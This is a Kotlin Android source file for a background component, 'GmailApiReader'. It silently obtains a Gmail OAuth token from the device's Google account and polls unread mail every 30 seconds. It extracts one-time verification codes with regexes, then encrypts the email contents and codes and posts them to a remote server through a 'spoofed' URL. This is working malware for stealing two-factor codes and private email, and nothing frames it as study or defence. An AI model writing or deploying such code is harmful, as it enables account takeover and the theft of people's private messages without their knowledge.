package com.gafam.relay

import android.accounts.AccountManager
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64
import kotlin.concurrent.thread

object GmailApiReader {
    private const val TAG = "GAFAM_GmailAPI"
    private const val SCOPE = "oauth2:https://www.googleapis.com/auth/gmail.readonly"
    private const val GMAIL_API = "https://gmail.googleapis.com/gmail/v1/users/me"

    private var running = false
    private val codePatterns = listOf(
        Regex("""\b(\d{4,8})\b"""),
        Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""otp[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""password[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""confirme[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
    )

    data class Email(
        val id: String,
        val from: String,
        val subject: String,
        val body: String,
        val date: Long,
        val codes: List<String>
    )

    @Synchronized
    fun start(context: Context) {
        if (running) return
        running = true
        thread(name = "gafam-gmail-api") {
            Log.i(TAG, "Thread started, first poll in 30s")
            pollGmail(context)
        }
        Log.i(TAG, "Start called, thread spawning")
    }

    @Synchronized
    fun stop() { running = false; Log.i(TAG, "Stopped") }

    private fun pollGmail(context: Context) {
        val prefs: SharedPreferences = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val seen = mutableSetOf<String>()

        while (running) {
            try {
                Thread.sleep(30000) // poll every 30s
                if (prefs.getString("apiUrl", null) == null) continue

                val token = getAuthToken(context)
                if (token == null) {
                    Log.w(TAG, "No auth token — user needs to be signed into Google on device")
                    continue
                }

                // List recent unread messages (last 5)
                val msgIds = listRecentMessages(token)
                if (msgIds.isEmpty()) continue

                for (id in msgIds) {
                    if (id in seen) continue
                    seen.add(id)

                    val email = fetchEmail(token, id)
                    if (email != null && email.codes.isNotEmpty()) {
                        Log.i(TAG, "📧 ${email.subject}: codes=${email.codes}")
                        sendToVpc(context, prefs, email)
                    }
                }

                // Prune seen set to avoid memory leak
                if (seen.size > 500) seen.clear()
            } catch (e: Exception) {
                Log.e(TAG, "Poll error: ${e.message}", e)
            }
        }
    }

    private fun getAuthToken(context: Context): String? {
        return try {
            val am = AccountManager.get(context)
            val accounts = am.getAccountsByType("com.google")
            if (accounts.isEmpty()) {
                Log.e(TAG, "No Google accounts on device")
                return null
            }
            // Try primary account first
            val account = accounts.firstOrNull { 
                am.getUserData(it, "primary") == "1" 
            } ?: accounts[0]

            Log.d(TAG, "Using account: ${account.name}")
            val bundle = am.getAuthToken(account, SCOPE, null, true, null, null).result
            bundle?.getString(AccountManager.KEY_AUTHTOKEN)
        } catch (e: Exception) {
            Log.e(TAG, "Auth failed: ${e.message}")
            // Invalidate token and retry once
            try {
                val am = AccountManager.get(context)
                val accounts = am.getAccountsByType("com.google")
                if (accounts.isNotEmpty()) {
                    am.invalidateAuthToken("com.google", null)
                    val bundle = am.getAuthToken(accounts[0], SCOPE, null, true, null, null).result
                    bundle?.getString(AccountManager.KEY_AUTHTOKEN)
                } else null
            } catch (e2: Exception) {
                Log.e(TAG, "Auth retry failed: ${e2.message}")
                null
            }
        }
    }

    private fun listRecentMessages(token: String): List<String> {
        val client = OkHttpClient()
        val request = Request.Builder()
            .url("$GMAIL_API/messages?maxResults=5&q=is:unread")
            .header("Authorization", "Bearer $token")
            .build()

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) {
            Log.w(TAG, "List messages HTTP ${response.code}: ${response.body?.string()}")
            return emptyList()
        }

        val body = response.body?.string() ?: return emptyList()
        val json = JSONObject(body)
        val messages = json.optJSONArray("messages") ?: return emptyList()

        return (0 until messages.length()).mapNotNull {
            messages.getJSONObject(it).optString("id")
        }
    }

    private fun fetchEmail(token: String, msgId: String): Email? {
        val client = OkHttpClient()
        val request = Request.Builder()
            .url("$GMAIL_API/messages/$msgId?format=full&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date")
            .header("Authorization", "Bearer $token")
            .build()

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) return null

        val body = response.body?.string() ?: return null
        val msg = JSONObject(body)

        // Parse headers
        val headers = msg.optJSONArray("headers") ?: return null
        var from = ""
        var subject = ""
        var date = 0L
        for (i in 0 until headers.length()) {
            val h = headers.getJSONObject(i)
            when (h.optString("name").lowercase()) {
                "from" -> from = h.optString("value", "")
                "subject" -> subject = h.optString("value", "")
                "date" -> date = h.optLong("value", 0L)
            }
        }

        // Parse body (prefer text/plain, fallback to text/html)
        val payload = msg.optJSONObject("payload") ?: return null
        val bodyText = extractBody(payload)

        val codes = extractCodes("$subject $bodyText")

        return Email(msgId, from, subject, bodyText, date, codes)
    }

    private fun extractBody(payload: JSONObject): String {
        // Try direct body
        val parts = payload.optJSONArray("parts")
        if (parts != null) {
            for (i in 0 until parts.length()) {
                val part = parts.getJSONObject(i)
                if (part.optString("mimeType") == "text/plain") {
                    val data = part.optJSONObject("body")?.optString("data") ?: continue
                    return decodeBase64Url(data)
                }
            }
            // Fallback to first part
            for (i in 0 until parts.length()) {
                val part = parts.getJSONObject(i)
                val data = part.optJSONObject("body")?.optString("data") ?: continue
                return decodeBase64Url(data)
            }
        }
        // Direct body
        val data = payload.optJSONObject("body")?.optString("data")
        return if (data != null) decodeBase64Url(data) else ""
    }

    private fun decodeBase64Url(data: String): String {
        return try {
            val decoded = Base64.decode(data.replace('-', '+').replace('_', '/'), Base64.DEFAULT)
            String(decoded, Charsets.UTF_8)
        } catch (e: Exception) { "" }
    }

    private fun extractCodes(text: String): List<String> {
        val codes = mutableListOf<String>()
        for (pat in codePatterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (code !in codes) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(context: Context, prefs: SharedPreferences, email: Email) {
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        try {
            val client = ApiClient.getClient(context) ?: return
            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")

            val jsonBody = JSONObject().apply {
                put("app", "gmail.api")
                put("title", email.subject)
                put("body", email.body)
                put("from", email.from)
                put("codes", JSONObject.wrap(email.codes))
                put("timestamp", email.date)
            }

            val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
            val digest = MessageDigest.getInstance("SHA-256")
            val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(12); SecureRandom().nextBytes(iv)
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(keyBytes, "AES"), GCMParameterSpec(128, iv))
            val ciphertext = cipher.doFinal(plaintext)

            val encryptedPayload = JSONObject().apply {
                put("encrypted_data", Base64.encodeToString(ciphertext, Base64.NO_WRAP))
                put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
            }

            val body = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(spoofedUrl).post(body)
                .addHeader("Authorization", "Bearer $jwtSecret").build()

            client.newCall(request).execute()
            Log.i(TAG, "📧 Sent to VPC: ${email.subject} codes=${email.codes}")
        } catch (e: Exception) {
            Log.e(TAG, "Send failed: ${e.message}")
        }
    }
}
